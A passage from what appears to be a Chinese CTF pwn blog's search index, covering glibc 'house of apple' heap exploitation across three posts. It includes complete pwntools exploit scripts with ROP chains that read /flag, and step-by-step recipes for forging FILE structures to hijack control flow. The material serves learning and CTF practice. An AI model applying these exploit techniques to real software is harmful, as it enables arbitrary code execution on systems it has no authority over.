heap_addr = heap_base + 0x7298        payload = b&#x27;/flag\\x00\\x00\\x00&#x27;        payload += flat(pop_rdi, heap_addr - 0x8, pop_rsi, 0, pop_rdx, 0,                        pop_rax, 2, syscall)        payload += flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 0, syscall)        payload += flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss(), pop_rdx,                        0x100, pop_rax, 1, syscall)        create(0x1200, payload)        create(0x590, fake_tcache[48:])        payload = b&#x27;\\x00&#x27; * 0xa0 + p64(heap_addr) + p64(ret)        create(0x400, payload)        create(0x3f0, p64(libc.symbols[&#x27;setcontext&#x27;] + 61 + libc_base))        delete(15)        # delete(9)        create(            0xb40, b&#x27;\\x00&#x27; * 0xb08 +            flat(0x521 | 4, libc_base + 0x1e4030, libc_base + 0x1e4030,                 heap_base + 0x6020, heap_base + 0x6020))        create(0x610, b&#x27;\\x00&#x27; * 0x608 + p64(0x500 | 4))        create(0x510)        r.recvuntil(b&#x27;&gt;&gt; &#x27;)        r.sendline(b&#x27;1&#x27;)        r.recvuntil(b&#x27;(: Size:&#x27;)        r.sendline(bytes(str(0x2000), encoding=&#x27;utf-8&#x27;))        # gdb.attach(r)        # pause()        context.log_level = &#x27;debug&#x27;    except:        r.close()r.interactive()\n\n在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。\n\n参考文章：\nhttps://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["HeapFengShui","house of 系列"]},{"title":"house of apple","url":"/2022/07/26/house-of-apple/","content":"简单介绍在高版本中large bin attack算是为数不多的可以任意地址写堆地址的方法。\n这一利用方式是相较于其他house of 系列来说存在一定差异，它不是直接通过IO_FILE getshell是通过扩大现存的写堆地址漏洞的方式，从而辅佐其他house of 系列。\n利用条件\n程序从main函数返回或能调用exit函数\n能泄露出heap地址和libc地址\n能使用一次largebin attack\n\n利用原理调用链和house of pig一致：\nexit=&gt;fcloseall=&gt;_IO_cleanup=&gt;_IO_flush_all_lockp=&gt;_IO_OVERFLOW\n首先在vtbale中存在这样一个函数：\nstatic wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123;  /* When we come to here this means the user supplied buffer is     filled.  But since we must return the number of characters which     would have been written in total we must provide a buffer for     further use.  We can do this by writing on and on in the overflow     buffer in the _IO_wstrnfile structure.  */  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;   if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)    &#123;      _IO_wsetb (fp, snf-&gt;overflow_buf,         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)                      / sizeof (wchar_t)), 0);       fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf                      + (sizeof (snf-&gt;overflow_buf)                     / sizeof (wchar_t)));    &#125;   fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;   /* Since we are not really interested in storing the characters     which do not fit in the buffer we simply ignore it.  */  return c;&#125;\n\n首先是将fp转化为_IO_wstrnfile结构体\ntypedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n根据上面，如果通过fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf判断则会对fp-&gt;_wide_data的_IO_write_base、_IO_read_base、_IO_read_ptr和_IO_read_end赋值为snf-&gt;overflow_buf或者与该地址一定范围内偏移的值，最后对fp-&gt;_wide_data的_IO_write_ptr和_IO_write_end赋值。\n只要控制了fp-&gt;_wide_data，就可以控制从fp-&gt;_wide_data开始一定范围内的内存的值，也就等同于任意地址写已知地址\n不过可以看到在赋值之前会路过这一函数：\nvoid_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    free (f-&gt;_wide_data-&gt;_IO_buf_base);  f-&gt;_wide_data-&gt;_IO_buf_base = b;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;  if (a)    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;  else    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;&#125;\n\n所以一般来说需要绕过free函数，所以我们可以控制_flags2=8即可\n随后就是_IO_wstrnfile结构体涉及到其他结构体：\nstruct _IO_str_fields&#123;  _IO_alloc_type _allocate_buffer_unused;  _IO_free_type _free_buffer_unused;&#125;; struct _IO_streambuf&#123;  FILE _f;  const struct _IO_jump_t *vtable;&#125;; typedef struct _IO_strfile_&#123;  struct _IO_streambuf _sbf;  struct _IO_str_fields _s;&#125; _IO_strfile; typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  char overflow_buf[64];&#125; _IO_strnfile;  typedef struct&#123;  _IO_strfile f;  /* This is used for the characters which do not fit in the buffer     provided by the user.  */  wchar_t overflow_buf[64];&#125; _IO_wstrnfile;\n\n因为其中存在着其他结构体，最后可以看出来overflow_buf的偏移量位0xf0，那就是在vtable后面\n而struct _IO_wide_data结构体如下：\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n最后呢，也就是在调用vtable之前需要绕过的一点是：\nint_IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    &#123;      run_fp = fp;      if (do_lock)\t_IO_flockfile (fp);      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\t   || (_IO_vtable_offset (fp) == 0\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\t   )\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\tresult = EOF;      if (do_lock)\t_IO_funlockfile (fp);      run_fp = NULL;    &#125;#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;&#125;\n\n构造方式这里我看原创文章的构造描述和他写的demo的构造方式存在一定差异，所以我这里根据下面的demo来描述构造方式：\n\n首先修改vtable的值为：_IO_wstrn_jumps\n绕过free，修改_flags2的值为8\n修改_IO_write_ptr的值为-1\n最后修改_wide_data的地址为我们的目标地址\n\n利用思路这里修改mp_结构体和global_max_fast就不再赘述，这两者的攻击方式类似，这里重点提一下如何配合house of pig\n与house of pig的联用在我之前的FSOP这篇文章的关于vtable的检验实际上并不完善，其中只提到了检验内部vtable，关于外部vtable的检验没怎么提。\n_IO_vtable_check (void)&#123;#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check)    return;  /* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  */  &#123;    Dl_info di;    struct link_map *l;    if (!rtld_active ()        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))      return;  &#125;#else /* !SHARED */  /* We cannot perform vtable validation in the static dlopen case     because FILE * handles might be passed back and forth across the     boundary.  Therefore, we disable checking in this case.  */  if (__dlopen != NULL)    return;#endif  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\\n&quot;);&#125;\n\n可以看到这里如果我们的flag值等于_IO_vtable_check的值，函数就会立即返回\n\n通过汇编代码可知这里是将IO_accept_foreign_vtables经过PTR_DEMANGLE这样一个函数的变化最后进行比较，而在house of emma中这个函数的本质就是上面汇编中显示的循环右移0x11然后与fs:0x30也就是pointer_guard进行异或。所以，如果pointer_guard和IO_accept_foreign_vtables是我们已知的值，我们即可绕过这一判断。最后任意伪造vtable劫持程序执行流即可。\n与house of emma联用相较于上面的需要进行两次任意地址写的情况，这一利用方式算是比较简单，只需要通过house of apple修改pointer_guard的值，随后进行house of emma即可。\n例题演示例题使用的方式为house of apple &amp; house of emma\n因为原创已经分析过了，这里就不再分析了，这里主要提一下堆风水即可。\n首先题目申请chunk的size只能申请三种，分别是：key+0x10，key+0x20，2*key+0x10\n并且题目的输入只能输入一次，所以我们需要在修改掉已经在large bin中的chunk的bk_nextsize的指针的同时修改掉即将进入large bin的chunk的内容为我们伪造的IO_FILE结构体。\n所以我们的目标是，有一个指针指向我们已经在large bin中的chunk，并且在这个chunk的内部还存在一个我们即将进入large bin的chunk，并且我们还希望，在修改bk_nextsize之后紧接着就可以修改掉后一个chunk的内容，让我们可控的内容尽可能的多一点。(其实仔细思考一下发现我们完全可以构造成ptr，ptr+0x30效果也是差不多，构造起来还较为简单一点)\nexpfrom pwn import *elf = ELF(&#x27;./oneday&#x27;)r = process(&#x27;./oneday&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(opt):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;choise: &#x27;)    r.sendline(bytes(str(opt), encoding=&#x27;utf-8&#x27;))def delete(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, msg):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Message:&#x27;)    r.send(msg)def show(idx):    r.recvuntil(b&#x27;enter your command:&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def pack_file(IO_write_base=0,              IO_write_ptr=0,              _chain=0,              _lock=0,              _wide_data=0,              _mode=0,              vtable=0):    IO_FILE = b&#x27;\\x00&#x27; * 0x20 + p64(IO_write_base) + p64(IO_write_ptr)    IO_FILE = IO_FILE.ljust(0x68, b&#x27;\\x00&#x27;) + p64(_chain) + p32(0) + p32(8)    IO_FILE = IO_FILE.ljust(0x88, b&#x27;\\x00&#x27;) + p64(_lock)    IO_FILE = IO_FILE.ljust(0xa0, b&#x27;\\x00&#x27;) + p64(_wide_data)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;) + p64(_mode)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILEdef ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;enter your key &gt;&gt;&#x27;)r.sendline(b&#x27;10&#x27;)create(2)create(2)create(1)delete(2)delete(1)delete(0)create(1)create(1)create(1)create(1)delete(3)delete(5)show(3)r.recvuntil(b&#x27;Message: \\n&#x27;)libc_base = u64(r.recv(8)) - 0x1f2cc0heap_base = u64(r.recv(8)) - 0x17f0print(hex(heap_base))print(hex(libc_base))_IO_list_all = libc_base + 0x1f3660pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))point_guard_addr = libc_base + 0x3c0770 - 0x10_IO_wstrn_jumps = libc_base + 0x1f3d20_IO_cookie_jumps = libc_base + 0x1f3ae0gadget = libc_base + 0x146020setcontext = libc_base + 0x50bc0open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]write_addr = libc_base + libc.symbols[&#x27;write&#x27;]flag_addr = heap_base + 0x1a88delete(4)delete(6)create(3)create(1)create(1)file1 = pack_file(0, 1, heap_base + 0x1900, libc_base + 0x1f5720,                  point_guard_addr, 0, _IO_wstrn_jumps)file2 = pack_file(0, 1, 0, libc_base + 0x1f5720, 0, 0, _IO_cookie_jumps + 0x58)delete(8)create(3)payload = flat(0, _IO_list_all - 0x20, 0, 0xa81) + file1[0x10:]payload = payload.ljust(0x100, b&#x27;\\x00&#x27;) + file2 + flat(    heap_base + 0x1900 + 0x100, ROL(gadget ^ (heap_base + 0x1900), 0x11))payload = payload.ljust(0x108 + 0x20, b&#x27;\\x00&#x27;) + p64(setcontext + 61)payload = payload.ljust(0x108 + 0x68, b&#x27;\\x00&#x27;) + p64(flag_addr) + p64(0)payload = payload.ljust(    0x108 + 0xa0, b&#x27;\\x00&#x27;) + p64(heap_base + 0x1900 + 0x200) + p64(open_addr)payload = payload.ljust(    0x200, b&#x27;\\x00&#x27;) + flat(pop_rdi, 3, pop_rsi, libc_base + libc.bss() + 0x100,                           pop_rdx, 0x100, read_addr)payload = payload + flat(pop_rdi, 1, pop_rsi, libc_base + libc.bss() + 0x100,                         pop_rdx, 0x100, write_addr) + b&#x27;/flag\\x00\\x00\\x00&#x27;payload = payload.ljust(0xa90, b&#x27;\\x00&#x27;) + flat(0, 0xab1)payload = payload.ljust(0xaa0, b&#x27;\\x00&#x27;)edit(5, payload)delete(2)create(3)print(hex(libc_base + libc.bss() + 0x100))gdb.attach(    r,    &#x27;b*$rebase(0x1439)\\ndir ../glibc_source/glibc-2.34/libio/\\nb _IO_wstrn_overflow&#x27;)r.recvuntil(b&#x27;enter your command:&#x27;)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n总结house of apple与以往的house of系列存在一定区别，他的效果只是任意地址写堆地址，将_IO_FILE地址+0xf0的地址写到_IO_wide_data所指向的地址(当然结合源码看的话可以看出来是进行一定范围的写操作)\n其实house of apple只是单纯的利用fcloseall函数会循环调用_IO_FILE的_chain，也就是利用一次任意地址写的机会进行多次_IO_FILE利用\n\n参考链接：https://bbs.pediy.com/thread-273418.htm\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of apple续","url":"/2022/08/05/house-of-apple2/","content":"死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。\nhouse of apple2利用条件：\n已知heap地址和glibc地址\n\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n\n能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制\n\n\n利用原理在https://cv196082.gitee.io/2022/02/23/FSOP/ 这篇文章中详细介绍了去调用vtable中的函数指针时会经过什么验证。\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */   __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n注意_IO_wide_data结构体中存在_wide_vtable成员，在调用_wide_vtable虚表是同样会经过一系列宏去调用：\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n在这里调用的顺序中没有出现vtable是否合法的检测，因此我们可以劫持_IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可以控制的堆空间，进一步控制_wide_data-&gt;_wide_vtable指向可以控制的堆地址，控制程序IO流函数调用，最终调用到IO_wxxxxx\n利用思路这里最终目的是调用_wide_vtable成员，所以需要找到上述宏的调用，最终发现只存在以下四个：_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE、_IO_WOVERFLOW\n并且其中前两个还是利用难度较高，甚至是无法利用。下面从原文的三个方向出发\n_IO_wfile_overflow这里的调用链为：_IO_wfile_overflow=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+ 0x68)(fp)\nwint_t    _IO_wfile_overflow (FILE *f, wint_t wch)&#123;    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;        f-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    /* If currently reading or no buffer allocated. */    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)    &#123;        /* Allocate a buffer if needed. */        if (f-&gt;_wide_data-&gt;_IO_write_base == 0)        &#123;            _IO_wdoallocbuf (f);           ......        &#125;    &#125;&#125;\n\n需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0\n接着看_IO_wdoallocbuf\nvoid_IO_wdoallocbuf (FILE *fp)&#123;  if (fp-&gt;_wide_data-&gt;_IO_buf_base)    return;  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)      return;  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);&#125;libc_hidden_def (_IO_wdoallocbuf)\n\n这里就调用了IO_Wxxxx并且需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。\n所以总的来说构造方式为：\n\n_flags = ~(2 | 0x8 | 0x800)即可，所以可以直接设置为0或者这值为  sh;\nvtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;_IO_wdoallocbuf=&gt;_IO_WDOALLOCATE=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable +0x68)(fp)\nstatic wint_t_IO_wfile_underflow_mmap (FILE *fp)&#123;  struct _IO_codecvt *cd;  const char *read_stop;   if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    &#125;  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;   cd = fp-&gt;_codecvt;   /* Maybe there is something left in the external buffer.  */  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end      /* No.  But maybe the read buffer is not fully set up.  */      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */    return WEOF;   /* There is more in the external.  Convert it.  */  read_stop = (const char *) fp-&gt;_IO_read_ptr;   if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;      /* Maybe we already have a push back pointer.  */      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)    &#123;      free (fp-&gt;_wide_data-&gt;_IO_save_base);      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;    &#125;      _IO_wdoallocbuf (fp);    &#125;    ......&#125;\n\n这里需要改写的有点略多了，需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。\n构造方式：\n\n_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为  sh;\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0\n_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n_IO_wdefault_xsgetn调用链：_IO_wdefault_xsgetn=&gt;__wunderflow=&gt;_IO_switch_to_wget_mode=&gt;_IO_WOVERFLOW=&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable+0x18)(fp)\nsize_t    _IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)&#123;    size_t more = n;    wchar_t *s = (wchar_t*) data;    for (;;)    &#123;        /* Data available. */        ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end                         - fp-&gt;_wide_data-&gt;_IO_read_ptr);        if (count &gt; 0)        &#123;            if ((size_t) count &gt; more)                count = more;            if (count &gt; 20)            &#123;                s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);                fp-&gt;_wide_data-&gt;_IO_read_ptr += count;            &#125;            else if (count &lt;= 0)                count = 0;            else            &#123;                wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;                int i = (int) count;                while (--i &gt;= 0)                    *s++ = *p++;                fp-&gt;_wide_data-&gt;_IO_read_ptr = p;            &#125;            more -= count;        &#125;        if (more == 0 || __wunderflow (fp) == WEOF)            break;    &#125;    return n - more;&#125;libc_hidden_def (_IO_wdefault_xsgetn)\n\n需要设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。\nwint_t    __wunderflow (FILE *fp)&#123;    if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))        return WEOF;    if (fp-&gt;_mode == 0)        _IO_fwide (fp, 1);    if (_IO_in_put_mode (fp))        if (_IO_switch_to_wget_mode (fp) == EOF)            return WEOF;    ......&#125;\n\n需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。\nint    _IO_switch_to_wget_mode (FILE *fp)&#123;    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)            return EOF;    .....&#125;\n\n需要设置fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base\n构造方式：\n\n_flags设置为0x800\nvtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可\n_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0\n_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A\n_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)\n_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C\n\nhouse of apple3前两篇文章中的利用链主要关注_wide_data成员，而本篇文章并不会特别关注_wide_data，而是关注FILE结构体的另外一个成员_codecvt的利用。\n利用条件\n已知heap地址和glibc地址\n能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发\n能控制_IO_FILE的vtable和_codecvt，一般使用largebin attack去控制\n\n注意上面提到，本篇文章并不会特别关注_wide_data成员，这是因为_wide_data设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的_wide_data成员（默认会指向_IO_wide_data_2，除了_wide_vtable外其他成员均默认为0），也并不影响house of apple3的利用。因此，如果能伪造整个FILE结构体，则需要设置合适的_wide_data；如果只能伪部分FILE的成员的话，保持fp-&gt;_wide_data为默认地址即可。\n利用原理FILE结构体中有一个成员struct _IO_codecvt *_codecvt;，偏移为0x98。\nstruct _IO_codecvt&#123;  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;&#125;;\n\n__cd_in和__cd_out是同一种类型的数据。\ntypedef struct&#123;  struct __gconv_step *step;  struct __gconv_step_data step_data;&#125; _IO_iconv_t;\n\n再观察以下结构体俩变量的定义：\nstruct __gconv_step&#123;  struct __gconv_loaded_object *__shlib_handle;  const char *__modname;   /* For internal use by glibc.  (Accesses to this member must occur     when the internal __gconv_lock mutex is acquired).  */  int __counter;   char *__from_name;  char *__to_name;   __gconv_fct __fct;  __gconv_btowc_fct __btowc_fct;  __gconv_init_fct __init_fct;  __gconv_end_fct __end_fct;   /* Information about the number of bytes needed or produced in this     step.  This helps optimizing the buffer sizes.  */  int __min_needed_from;  int __max_needed_from;  int __min_needed_to;  int __max_needed_to;   /* Flag whether this is a stateful encoding or not.  */  int __stateful;   void *__data;        /* Pointer to step-local data.  */&#125;;\n\nstruct __gconv_step_data&#123;  unsigned char *__outbuf;    /* Output buffer for this step.  */  unsigned char *__outbufend; /* Address of first byte after the output                 buffer.  */   /* Is this the last module in the chain.  */  int __flags;   /* Counter for number of invocations of the module function for this     descriptor.  */  int __invocation_counter;   /* Flag whether this is an internal use of the module (in the mb*towc*     and wc*tomb* functions) or regular with iconv(3).  */  int __internal_use;   __mbstate_t *__statep;  __mbstate_t __state;    /* This element must not be used directly by               any module; always use STATEP!  */&#125;;\n\nhouse of apple3的利用主要关注以下三个函数：__libio_codecvt_out、__libio_codecvt_in和__libio_codecvt_length。三个函数的利用点都差不多\nenum __codecvt_result    __libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,                        const char *from_start, const char *from_end,                        const char **from_stop,                        wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)&#123;    enum __codecvt_result result;    struct __gconv_step *gs = codecvt-&gt;__cd_in.step;    int status;    size_t dummy;    const unsigned char *from_start_copy = (unsigned char *) from_start;    codecvt-&gt;__cd_in.step_data.__outbuf = (unsigned char *) to_start;    codecvt-&gt;__cd_in.step_data.__outbufend = (unsigned char *) to_end;    codecvt-&gt;__cd_in.step_data.__statep = statep;    __gconv_fct fct = gs-&gt;__fct;    #ifdef PTR_DEMANGLE    if (gs-&gt;__shlib_handle != NULL)        PTR_DEMANGLE (fct);    #endif    status = DL_CALL_FCT (fct,                          (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,                           (const unsigned char *) from_end, NULL,                           &amp;dummy, 0, 0));    ......&#125;\n\ntypedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,                const unsigned char **, const unsigned char *,                unsigned char **, size_t *, int, 